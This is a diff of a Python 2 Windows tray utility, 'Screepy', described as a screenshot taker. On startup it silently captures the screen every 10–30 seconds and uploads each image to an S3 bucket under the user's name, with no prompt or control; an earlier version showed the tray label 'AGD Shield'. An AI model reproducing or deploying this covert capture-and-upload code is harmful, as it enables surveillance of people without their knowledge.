@@ -1,9 +1,13 @@
-
-
 #!/usr/bin/env python
-# Writer     :     M Rezaur Rahman
-# Thanks to Simon Brunning - simon@brunningonline.net for SysTrayIcon Module
 
+# File     : Screepy.py
+# Synopsis   : Screenshot taker for windows.
+# Programmer : M Rezaur Rahman  
+# Used module: SysTrayIcon.py by Simon Brunning - simon@brunningonline.net
+# Date       : 11 August 2015
+# Notes      : Based on (i.e. ripped off from) Mark Hammond's
+#              win32gui_taskbar.py and win32gui_menu.py demos from PyWin32
+         
 import os
 import sys
 import win32api
@@ -27,10 +31,6 @@ except ImportError:
 
 
 
-
-
-
-
 class SysTrayIcon(object):
     '''TODO'''
     QUIT = 'QUIT'
@@ -41,8 +41,6 @@ class SysTrayIcon(object):
     username =  getpass.getuser()
     SaveDirectory=r'C:\screepy'
     ImageEditorPath=r'C:\WINDOWS\system32\mspaint.exe'
-
-    
     def __init__(self,
                  icon,
                  hover_text,
@@ -55,7 +53,6 @@ class SysTrayIcon(object):
         self.hover_text = hover_text
         self.on_quit = on_quit
         self.capture_and_send()
-
         menu_options = menu_options + (('Quit', None, self.QUIT),)
         self._next_action_id = self.FIRST_ID
         self.menu_actions_by_id = set()
@@ -96,35 +93,10 @@ class SysTrayIcon(object):
         win32gui.UpdateWindow(self.hwnd)
         self.notify_id = None
         self.refresh_icon()
-        win32gui.PumpMessages()
         
+        win32gui.PumpMessages()
 
-       	
-      
-
-
-
-
-    
-
-    def capture_and_send(self):
-	    interval = randint(10,30)
-	    threading.Timer(interval, self.capture_and_send).start ()
-	    try:
-  		    img=ImageGrab.grab()
-  		    saveas=os.path.join(self.SaveDirectory,'ScreenShot_'+time.strftime('%Y_%m_%d_%H_%M_%S')+'.jpg')
-  		    fname = 'ScreenShot_'+time.strftime('%Y_%m_%d_%H_%M_%S')+'.jpg'
-  		    img.save(saveas, quality=50, optimize=True)
-  		    editorstring='""%s" "%s"'% (self.ImageEditorPath,saveas) #Just for Windows right now?
-  		    data = open(self.SaveDirectory+'\\'+fname, 'rb')
-  		    self.s3.Bucket('screepy').put_object(Key=self.username+'/'+fname, Body=data)
-  	    except Exception, e:
-  		    print e
-  		    #3+3
-
-
-
-
+        
 
     def _add_ids_to_menu_options(self, menu_options):
         result = []
@@ -142,6 +114,21 @@ class SysTrayIcon(object):
                 print 'Unknown item', option_text, option_icon, option_action
             self._next_action_id += 1
         return result
+
+
+    def capture_and_send(self):
+      interval = randint(10,30)
+      threading.Timer(interval, self.capture_and_send).start ()
+      try:
+          img=ImageGrab.grab()
+          saveas=os.path.join(self.SaveDirectory,'ScreenShot_'+time.strftime('%Y_%m_%d_%H_%M_%S')+'.jpg')
+          fname = 'ScreenShot_'+time.strftime('%Y_%m_%d_%H_%M_%S')+'.jpg'
+          img.save(saveas, quality=50, optimize=True)
+          editorstring='""%s" "%s"'% (self.ImageEditorPath,saveas) #Just for Windows right now?
+          data = open(self.SaveDirectory+'\\'+fname, 'rb')
+          self.s3.Bucket('screepy').put_object(Key=self.username+'/'+fname, Body=data)
+      except Exception, e:
+          print e    
         
     def refresh_icon(self):
         # Try and find a custom icon
@@ -254,12 +241,6 @@ class SysTrayIcon(object):
             win32gui.DestroyWindow(self.hwnd)
         else:
             menu_action(self)
-
-
-
-
-
-
             
 def non_string_iterable(obj):
     try:
@@ -273,25 +254,15 @@ def non_string_iterable(obj):
 # directory in order for this to work...
 if __name__ == '__main__':
     import itertools, glob
-    SaveDirectory=r'C:\screepy'
-    icons = itertools.cycle(glob.glob(SaveDirectory+'\\'+'*.ico'))
-    hover_text = "AGD Shield"
-    # def hello(sysTrayIcon): print "Hello World."
-    # def simon(sysTrayIcon): print "Hello Simon."
-    # def switch_icon(sysTrayIcon):
-    #     sysTrayIcon.icon = icons.next()
-    #     sysTrayIcon.refresh_icon()
-    # menu_options = (('Say Hello', icons.next(), hello),
-    #                 ('Switch Icon', None, switch_icon),
-    #                 ('A sub-menu', icons.next(), (('Say Hello to Simon', icons.next(), simon),
-    #                                               ('Switch Icon', icons.next(), switch_icon),
-    #                                              ))
+    
+    icons = itertools.cycle(glob.glob('*.ico'))
+    hover_text = "SysTrayIcon.py Demo"
+    def hello(sysTrayIcon): print "Hello World."
+    def simon(sysTrayIcon): print "Hello Simon."
+    def switch_icon(sysTrayIcon):
+        sysTrayIcon.icon = icons.next()
+        sysTrayIcon.refresh_icon()
     menu_options = ()
-    def bye(sysTrayIcon): 3+3
+    def bye(sysTrayIcon): print 'Bye, then.'
     
     SysTrayIcon(icons.next(), hover_text, menu_options, on_quit=bye, default_menu_index=1)
-    #time.sleep(60)
-    
-
-
-
